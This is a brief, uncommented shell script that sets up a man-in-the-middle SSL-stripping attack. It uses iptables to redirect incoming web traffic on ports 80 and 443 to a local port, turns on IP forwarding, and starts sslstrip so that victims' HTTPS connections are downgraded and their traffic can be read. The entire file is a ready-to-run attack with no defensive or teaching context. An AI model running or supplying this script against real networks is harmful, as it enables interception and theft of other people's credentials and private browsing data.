#!/bin/sh
PORT=8080

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORT
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $PORT

echo 1 > /proc/sys/net/ipv4/ip_forward

sslstrip -f -l $PORT
